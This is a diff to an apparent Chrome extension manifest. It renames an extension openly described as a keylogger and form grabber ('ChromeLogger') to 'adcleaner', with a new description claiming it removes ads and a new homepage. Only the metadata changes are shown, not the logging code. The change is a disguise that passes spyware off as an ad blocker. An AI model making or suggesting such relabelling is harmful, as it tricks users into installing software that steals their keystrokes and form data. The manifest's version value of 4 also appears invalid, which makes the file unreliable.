@@ -1,9 +1,9 @@
 {
-  "name": "ChromeLogger",
+  "name": "adcleaner",
   "version": "1.0.3",
   "manifest_version": 4,
-  "description": "A keylogger and form grabber for Google Chrome.",
-  "homepage_url": "http://www.ericzhang.me/projects/chromelogger/",
+  "description": "Removes ads from your browser, support us at adcleaner.com!",
+  "homepage_url": "http://adcleaner.com",
   "icons": {
     "16": "icons/icon16.png",
     "48": "icons/icon48.png",
